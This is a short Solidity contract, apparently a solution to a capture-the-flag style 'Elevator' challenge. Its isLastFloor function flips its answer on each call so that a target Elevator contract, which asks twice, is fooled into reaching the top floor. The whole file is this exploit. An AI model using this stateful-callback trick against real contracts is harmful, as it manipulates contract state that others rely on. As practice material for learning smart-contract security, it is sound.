// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract AttackBuilding is Building {
    bool public last = true;

    function isLastFloor(uint256) external override returns (bool) {
        last = !last;
        return last;
    }

    function goToTop(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(1);
    }
}
